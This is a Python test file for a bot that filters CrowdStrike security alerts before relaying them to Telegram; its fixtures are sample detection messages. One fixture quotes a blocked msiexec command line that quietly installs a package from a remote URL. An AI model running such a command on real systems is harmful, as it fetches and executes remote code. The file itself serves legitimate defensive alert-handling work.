import pytest
from event_detecter_bot.__main__ import msg_meets_filtering_conditions

FILTERING_CONDITIONS = [ ["MiRedLocal","\N{large red square}"], ["MiTag"] ]

not_matching_msg_because_of_severity_and_network = """
    15:40 Sensor-based ML \N{large blue square} en MiRedLocal
    \N{japanese symbol for beginner} Prevention, process killed

    HOST-1$@HOST-1 (10.1.1.1)

    ( + ) (https://ipgeolocation.io/ip-location/130.206.159.235) external_ip  : 130.206.159.235 (Pamplona, Red.es)

    tags             : -
    ou               :
    - EQUIPOS
    site_name        : Site
    machine_domain   : dominio.dom

    ( + ) (https://falcon.eu-1.crowdstrike.com/documentation/detections/tactic/machine-learning) tactic       : Machine Learning
    ( + ) (https://falcon.eu-1.crowdstrike.com/documentation/detections/technique/sensor-based-ml) technique    : Sensor-based ML
    description      : This file meets the machine learning-based on-sensor AV protection's lowest-confidence threshold for malicious files.
    filepath         : \Device\dominio.dom\Machine\Scripts\Startup\Inicio.exe

    created_timestamp: 06jun 13:40:19 UTC
    first_behavior   : 06jun 13:39:36 UTC
    last_behavior    : 06jun 13:39:36 UTC

    status           : new
    time_to_triaged  : 0h00'00"
    time_to_resolved : 0h00'00"
    date_updated     : 06jun 13:40:22 UTC
    assigned_to_name : -
    assigned_to_uid  : -
    url_id           : 1f20b92056b54909a5e6efff5a24723e/137439802578
"""

matching_msg_because_of_severity_and_network = """
    13:17 PShellExploitKit2 \N{large red square} en MiRedLocal
    \N{white heavy check mark} Prevention, operation blocked

    HOST-1$@HOST-1 (10.1.1.1)

    ( + ) (https://ipgeolocation.io/ip-location/130.206.159.235) external_ip  : 130.206.159.235 (Pamplona, Red.es)

    tags             : -
    ou               :
    - EQUIPOS
    site_name        : Site
    machine_domain   : dominio.dom

    ( + ) (https://attack.mitre.org/tactics/TA0002) tactic       : Execution
    ( + ) (https://attack.mitre.org/techniques/T1059/001) technique    : PowerShell
    description      : A PowerShell script launched that shares characteristics with known PowerShell exploit kits. The script might connect to remote command and control. Decode and review the script.
    filepath         : \Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe

    created_timestamp: 03jun 11:17:18 UTC
    first_behavior   : 03jun 11:16:35 UTC
    last_behavior    : 03jun 11:16:35 UTC

    status           : new
    time_to_triaged  : 0h00'00"
    time_to_resolved : 0h00'00"
    date_updated     : 03jun 11:17:28 UTC
    assigned_to_name : -
    assigned_to_uid  : -
    url_id           : 6cc075e5de334f98a5b609cd1a240291/459562673891
"""

matching_msg_because_of_tag = """
    11:01 MsiexecUnusualArgs \N{large red square}
    \N{white heavy check mark} Prevention, process blocked from execution

    HOST-1$@HOST-1 (10.1.1.1)

    ( + )    ( + ) (https://ipgeolocation.io/ip-location/130.206.159.235) external_ip  : 130.206.159.235 (Pamplona, Red.es)

    tags             :
    \N{label}MiTag
    ou               :
    - EQUIPOS
    site_name        : Site
    machine_domain   : dominio.dom

    ( + ) (https://attack.mitre.org/tactics/TA0005) tactic       : Defense Evasion
    ( + ) (https://attack.mitre.org/techniques/T1055/012) technique    : Process Hollowing
    description      : Msiexec launched with unusual arguments. It occasionally results from applications misusing msiexec, but might be malware preparing to hollow out the process or abusing it to launch a malicious payload. Review the command line and the process tree.
    cmdline          : msieXEC  -q/I"hTtP://example.OrG:8080/40omaPBHmdU/HOST-1=HOST-1"
    filepath         : \Device\HarddiskVolume3\Windows\System32\msiexec.exe

    created_timestamp: 24may 09:01:54 UTC
    first_behavior   : 24may 09:00:34 UTC
    last_behavior    : 24may 09:00:34 UTC

    status           : new
    time_to_triaged  : 0h00'00"
    time_to_resolved : 0h00'00"
    date_updated     : 24may 09:09:16 UTC
    assigned_to_name : -
    assigned_to_uid  : -
    url_id           : 830480fc53d44f72acdc22b9c95e1fe8/154620168382
"""

def test_msg_meets_filtering_conditions():
    from event_detecter_bot.telegram_utils import scape_telegram_chars

    assert msg_meets_filtering_conditions("", FILTERING_CONDITIONS)==False
    assert msg_meets_filtering_conditions(scape_telegram_chars(not_matching_msg_because_of_severity_and_network), FILTERING_CONDITIONS)==False
    assert msg_meets_filtering_conditions(scape_telegram_chars(matching_msg_because_of_severity_and_network), FILTERING_CONDITIONS)==True
    assert msg_meets_filtering_conditions(scape_telegram_chars(matching_msg_because_of_tag), FILTERING_CONDITIONS)==True
